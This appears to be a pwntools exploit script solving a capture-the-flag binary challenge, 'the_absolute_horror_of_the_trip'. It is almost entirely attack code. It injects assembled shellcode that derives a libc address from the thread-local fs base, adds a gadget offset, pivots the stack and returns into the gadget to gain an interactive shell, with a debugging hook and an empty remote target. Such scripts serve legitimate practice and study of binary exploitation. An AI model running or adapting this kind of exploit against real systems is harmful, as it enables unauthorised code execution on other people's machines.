#!/usr/bin/python3

from pwn import *

exe = ELF('the_absolute_horror_of_the_trip_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1262

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
pa = asm(f"""
            mov r13, [fs:0]
            sub r13, 0x740
            add r13, 0x3000
            add r13, 0xdabb3
            mov rbp, 0x6969696500
            mov rsp, 0x6969696500
            push r13
            mov rdi, 0
            ret
         """)
sl(pa)
p.interactive()
